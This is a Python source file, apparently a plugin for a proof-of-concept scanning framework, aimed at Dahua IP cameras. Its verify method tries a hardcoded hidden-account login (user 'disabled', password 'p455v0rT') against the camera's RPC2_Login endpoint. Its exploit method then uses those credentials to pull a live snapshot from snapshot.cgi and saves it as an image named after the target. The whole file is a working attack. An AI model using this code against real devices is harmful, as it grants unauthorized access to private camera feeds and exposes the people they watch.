import requests
from requests.auth import HTTPDigestAuth

from loguru import logger

from .base import POCTemplate


class DahuaDisabled(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['dahua']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = ''

    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/RPC2_Login"
        headers = {
            'User-Agent': self.config.user_agent,
            'Host': ip,
            'Origin': 'http://' + ip,
            'Referer': 'http://' + ip,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Connection': 'close',
            'X-Requested-With': 'XMLHttpRequest',
        }
        _json = {
            "method": "global.login",
            "params": {
                "userName": "disabled",
                "password": "p455v0rT",
                "clientType": "Web3.0",
                "loginType": "Direct",
                "authorityType": "Default",
                "passwordType": "Plain",
            },
            "id": 1,
            "session": 0,
        }
        try:
            r = requests.post(url, headers=headers, json=_json, verify=False, timeout=self.config.timeout)
            if r.status_code == 200 and r.json()['result'] == True:
                return ip, str(port), self.product, 'disabled', 'p455v0rT', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
        return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))


POCTemplate.register_poc(DahuaDisabled)